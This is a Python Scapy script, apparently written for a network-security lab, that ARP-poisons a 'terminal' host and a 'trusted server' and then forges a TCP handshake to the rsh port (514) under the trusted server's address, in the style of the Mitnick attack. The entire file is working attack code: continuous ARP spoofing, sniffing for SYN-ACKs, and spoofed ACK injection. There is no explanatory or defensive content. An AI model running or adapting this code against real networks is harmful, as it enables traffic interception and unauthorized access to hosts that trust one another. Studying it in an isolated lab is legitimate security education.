from scapy.all import *
import subprocess
import threading
import re

TRUSTED_SERVER = "10.9.0.6"
X_TERMINAL = "10.9.0.5"
ATTACKER_IP = "10.9.0.1"

RSH_PORT = 514

def get_interface_name():
    result = subprocess.run(['ifconfig', '-a'], stdout=subprocess.PIPE)
    output = result.stdout.decode()

    interface_regex = re.compile(r'^(br-\w+):', re.MULTILINE)

    interfaces = interface_regex.findall(output)
    return interfaces[0]


def get_mac(ip_address):
    arp_request = ARP(op=1, psrc=ATTACKER_IP, pdst=ip_address)
    arp_response = sr1(arp_request, timeout=2, verbose=0)

    return arp_response.hwsrc


def spoof():
    arp_terminal = ARP(op=2, pdst=X_TERMINAL, hwdst=get_mac(X_TERMINAL), psrc=TRUSTED_SERVER)
    arp_trusted = ARP(op=2, pdst=TRUSTED_SERVER, hwdst=get_mac(TRUSTED_SERVER), psrc=X_TERMINAL)

    while True:
        send(arp_trusted, verbose=0)
        send(arp_terminal, verbose=0)
        time.sleep(1)


def handle_synack(package):
    if package.haslayer(TCP) and package[TCP].flags == 'SA':
        print("Received SYN-ACK packet")

        tcp_layer = package.getlayer(TCP)
        ack_packet = IP(src=TRUSTED_SERVER, dst=X_TERMINAL) / TCP(dport=RSH_PORT, sport=tcp_layer.dport, flags='A', seq=tcp_layer.ack, ack=tcp_layer.seq + 1)
        send(ack_packet, verbose=0)

        print("Sent ACK packet, handshake completed")

    elif package.haslayer(TCP) and package[TCP].flags == 'R':
        print("Dropping resets")
    

def sniff_packages():
    interface = get_interface_name()
    my_mac = get_if_hwaddr(interface)
    sniff_filter = f"ether dst {my_mac}"

    sniff(iface=interface, filter=sniff_filter, prn=handle_synack, store=0)


if __name__ == "__main__":
    print("Start spoofing")
    spoofing_thread = threading.Thread(target=spoof)
    spoofing_thread.start()

    print("starting sniffing")
    sniffing = threading.Thread(target=sniff_packages)
    sniffing.start()

    time.sleep(1)
    print(f"Faking 3-way handshake...")
    syn_package = IP(src=TRUSTED_SERVER, dst=X_TERMINAL) / TCP(dport=RSH_PORT, flags="S")
    send(syn_package, verbose=0)
